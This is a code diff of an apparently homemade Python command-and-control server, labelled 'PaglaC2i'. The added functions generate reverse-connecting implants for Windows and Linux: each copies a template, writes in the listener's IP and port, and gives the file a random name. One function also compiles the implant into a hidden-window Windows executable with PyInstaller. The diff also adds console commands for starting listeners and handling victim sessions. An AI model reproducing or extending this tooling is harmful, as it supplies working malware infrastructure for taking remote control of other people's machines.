@@ -4,9 +4,117 @@ import threading
 from prettytable import PrettyTable
 import time
 from datetime import datetime
+import random
+import string
+import os
+import os.path
+import shutil
+import subprocess
 
 def banner():
     print("   ___            _ _         ___ ____  _ \n  / _ \__ _  __ _| (_) __ _  / __\___ \(_)\n / /_)/ _` |/ _` | | |/ _` |/ /    __) | |\n/ ___/ (_| | (_| | | | (_| / /___ / __/| |\n\/    \__,_|\__, |_|_|\__,_\____/|_____|_|\n            |___/                         \n")
+
+def winplant():
+    ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f"{ran_name}.py"
+    check_cwd = os.getcwd()
+    
+    if os.path.exists(f"{check_cwd}/winplant.py"):
+        shutil.copy("winplant.py", file_name)
+
+    else:
+        print("[!] winplant.py not found.")
+    
+    with open(file_name) as f:
+        new_host = f.read().replace("INPUT_IP_HERE", host_ip)
+
+    with open(file_name, "w") as f:
+        f.write(new_host)
+        f.close()
+
+    with open(file_name) as f:
+        new_port = f.read().replace("INPUT_PORT_HERE", str(host_port))
+    
+    with open(file_name, "w") as f:
+        f.write(new_port)
+        f.close()
+    
+    if os.path.exists(f"{file_name}"):
+        print(f"[+] {file_name} saved to {check_cwd}.")
+    
+    else: 
+        print("[!] Error occurred during payload generation.")
+
+
+
+def linplant():
+    ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f"{ran_name}.py"
+    check_cwd = os.getcwd()
+    
+    if os.path.exists(f"{check_cwd}/linplant.py"):
+        shutil.copy("linplant.py", file_name)
+
+    else:
+        print("[!] linplant.py not found.")
+
+    with open(file_name) as f:
+        new_host = f.read().replace("INPUT_IP_HERE", host_ip)
+
+    with open(file_name, "w") as f:
+        f.write(new_host)
+        f.close()
+
+    with open(file_name) as f:
+        new_port = f.read().replace("INPUT_PORT_HERE", str(host_port))
+    
+    with open(file_name, "w") as f:
+        f.write(new_port)
+        f.close()
+    
+    if os.path.exists(f"{file_name}"):
+        print(f"[+] {file_name} saved to {check_cwd}.")
+    
+    else: 
+        print("[!] Error occurred during payload generation.")
+
+def exeplant():
+    ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f"{ran_name}.py"
+    exe_file = f"{ran_name}.exe"
+    check_cwd = os.getcwd()
+    
+    if os.path.exists(f"{check_cwd}/winplant.py"):
+        shutil.copy("winplant.py", file_name)
+
+    else:
+        print("[!] winplant.py not found.")
+
+    with open(file_name) as f:
+        new_host = f.read().replace("INPUT_IP_HERE", host_ip)
+
+    with open(file_name, "w") as f:
+        f.write(new_host)
+        f.close()
+
+    with open(file_name) as f:
+        new_port = f.read().replace("INPUT_PORT_HERE", str(host_port))
+    
+    with open(file_name, "w") as f:
+        f.write(new_port)
+        f.close()
+
+        pyinstaller_exec = f"pyinstaller {file_name} -w --clean --onefile --distpath ."
+        print(f"[+] Compiling executable {exe_file}...")
+        subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
+        os.remove(f"{ran_name}.spec")
+        shutil.rmtree("build")
+
+        if os.path.exists(f"{check_cwd}/{exe_file}"):
+            print(f"[+] {exe_file} saved to current directory.")
+        
+        else:
+            print("[!] Error occurred during payload generation.")
 
 def comm_in(targ_id):
     print("[+] Awaiting response...")
@@ -82,26 +190,43 @@ def comm_handler():
 
 if __name__ == "__main__":
     targets = []
+    listener_counter = 0
     banner()
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        host_ip = "127.0.0.1"
-        host_port = 1337
-    
-    except IndexError:
-        print("[-] Command line argument(s) missing. Please try again.")
-    
-    except Exception as e:
-        print(e)
-    
-    listener_handler()
     
     while True:
         try:
             command = input("#> ")
+
+            if command == "listeners -g":
+                host_ip = input("[*] Enter IP to listen on: ")
+                host_port = int(input("[*] Enter port to listen on: "))
+                listener_handler()
+                listener_counter += 1
+
+            if command == "winplant":
+                if listener_counter > 0:
+                    winplant()
+                
+                else:
+                    print("[!] You cannot generate a payload without an active listener.")
+
             
+            if command == "linplant":
+                if listener_counter > 0:
+                    linplant()
+                
+                else:
+                    print("[!] You cannot generate a payload without an active listener.")
+            
+            if command == "exeplant":
+                if listener_counter > 0:
+                    exeplant()
+                
+                else:
+                    print("[!] You cannot generate a payload without an active listener.")
+
             if command.split(" ")[0] == "sessions":
                 session_counter = 0
                 
